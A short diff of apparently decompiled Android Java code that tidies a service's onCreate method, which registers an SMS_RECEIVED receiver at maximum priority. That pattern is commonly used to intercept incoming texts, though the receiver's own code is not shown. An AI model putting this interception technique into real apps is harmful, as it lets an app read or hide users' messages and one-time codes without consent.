@@ -20,10 +20,10 @@ public class TMyService extends Service {
 
     public void onCreate() {
         super.onCreate();
-        IntentFilter v0 = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
-        v0.setPriority(2147483647);
+        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+        intentFilter.setPriority(Integer.MAX_VALUE);
         this.smsReceiver = new TRecevier();
-        this.registerReceiver(this.smsReceiver, v0);
+        this.registerReceiver(this.smsReceiver, intentFilter);
     }
 
     public void onDestroy() {
